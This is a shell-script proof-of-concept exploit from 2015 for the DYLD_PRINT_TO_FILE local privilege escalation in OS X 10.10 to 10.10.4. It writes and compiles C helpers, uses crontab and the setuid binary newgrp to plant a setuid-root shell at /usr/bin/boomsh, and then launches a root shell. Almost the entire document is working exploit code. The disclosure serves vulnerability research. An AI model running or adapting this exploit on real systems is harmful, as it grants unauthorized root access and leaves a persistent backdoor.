#!/bin/sh
#
# Simple Proof of Concept Exploit for the DYLD_PRINT_TO_FILE
# local privilege escalation vulnerability in OS X 10.10 - 10.10.4
#
# (C) Copyright 2015 Stefan Esser <stefan.esser@sektioneins.de>
#
# Wait months for a fix from Apple or install the following KEXT as protection
# https://github.com/sektioneins/SUIDGuard
#
# Use at your own risk. This copies files around with root permissions,
# overwrites them and deletes them afterwards. Any glitch could corrupt your
# system. So you have been warned.

SUIDVICTIM=/usr/bin/newgrp

# why even try to prevent a race condition?
TARGET=`pwd`/tmpXXXXX

rm -rf $TARGET
mkdir $TARGET

cat << EOF > $TARGET/boomsh.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
        setuid(0);
        setgid(0);
        system("/bin/bash -i");
        printf("done.\n");
        return 0;
}
EOF
cat << EOF > $TARGET/overwrite.c
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char **argv)
{
        int fd;
        char buffer[1024];
        ssize_t toread, numread;
        ssize_t numwritten;
        ssize_t size;

        /* disable O_APPEND */
        fcntl(3, F_SETFL, 0);
        lseek(3, 0, SEEK_SET);

        /* write file into it */
        fd = open(
EOF
echo "\"$TARGET/boomsh\"" >> $TARGET/overwrite.c
cat << EOF >> $TARGET/overwrite.c
        , O_RDONLY, 0);
        if (fd > 0) {

                /* determine size */
                size = lseek(fd, 0, SEEK_END);
                lseek(fd, 0, SEEK_SET);

                while (size > 0) {
                        if (size > sizeof(buffer)) {
                                toread = sizeof(buffer);
                        } else {
                                toread = size;
                        }

                        numread = read(fd, &buffer, toread);
                        if (numread < toread) {
                                fprintf(stderr, "problem reading\n");
                                _exit(2);
                        }
                        numwritten = write(3, &buffer, numread);
                        if (numread != numwritten) {
                                fprintf(stderr, "problem writing\n");
                                _exit(2);
                        }

                        size -= numwritten;

                }

                fsync(3);
                close(fd);
        } else {
                fprintf(stderr, "Cannot open for reading\n");
        }

        return 0;
}
EOF

cp $SUIDVICTIM $TARGET/backup
gcc -o $TARGET/overwrite $TARGET/overwrite.c
gcc -o $TARGET/boomsh $TARGET/boomsh.c

EDITOR=$TARGET/overwrite DYLD_PRINT_TO_FILE=$SUIDVICTIM crontab -e 2> /dev/null
echo "cp $TARGET/boomsh /usr/bin/boomsh; chmod 04755 /usr/bin/boomsh " | $SUIDVICTIM > /dev/null 2> /dev/null
echo "cp $TARGET/backup $SUIDVICTIM" | /usr/bin/boomsh > /dev/null 2> /dev/null

rm -rf $TARGET

/usr/bin/boomsh